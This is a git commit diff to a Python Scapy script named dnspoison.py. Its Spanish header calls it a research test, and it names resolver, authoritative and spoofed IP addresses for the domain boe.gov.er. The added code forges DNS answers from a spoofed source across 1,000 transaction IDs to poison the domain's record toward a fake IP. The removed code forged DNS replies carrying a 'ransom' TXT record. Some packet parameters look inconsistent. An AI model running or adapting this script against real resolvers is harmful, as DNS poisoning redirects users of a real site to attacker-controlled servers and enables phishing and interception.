635ba9bc83ff913450e6b56c117852e711e1ca45
hackingyseguridad <antonio_taboada@hotmail.es>
2020-11-19 08:38:38 +0100

    Update dnspoison.py

--- dnspoison.py
+++ dnspoison.py
@@ -1,11 +1,21 @@
-#!/usr/bin/python
+"Prueba con fines de investigacion de envio de respuestas DNS"
+"IP DNS Autoritativo 196.200.96.1 del dominio: boe.gov.er "
+"IP DNS Resolver: 196.200.104.106 "
+"IP real sitio boe.gov.er: 196.200.104.42 "
+"IP envenenada sitio fake: 217.127.199.128 "
+
 
 from scapy.all import *
+from scapy.layers.l2 import *
+import time
+url = "boe.gov.er"
+SPOOF_ADDR = '217.127.199.128'
+pkts = []
+for x in range (10000,11000):
+        pkt = Ether()/IP(dst="196.200.96.1",src="196.200.104.106")/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
+        pkts.append(pkt)
+dns = Ether()/IP(dst="217.127.199.128",src="196.200.104.42")/UDP()/DNS(qd=DNSQR(qname=url))
+sendp(dns, verbose = 0)
+for pkt in pkts:
+        sendp(pkt, verbose=0)
 
-def dnsRes(pkt):
-
-    # print pkt[IP].src
-    ip = pkt.getlayer(IP)
-    dns = pkt.getlayer(DNS)
-    return IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, type='TXT', ttl=10,rdata='ransom'))
-    send(dnsRes(a[0]))
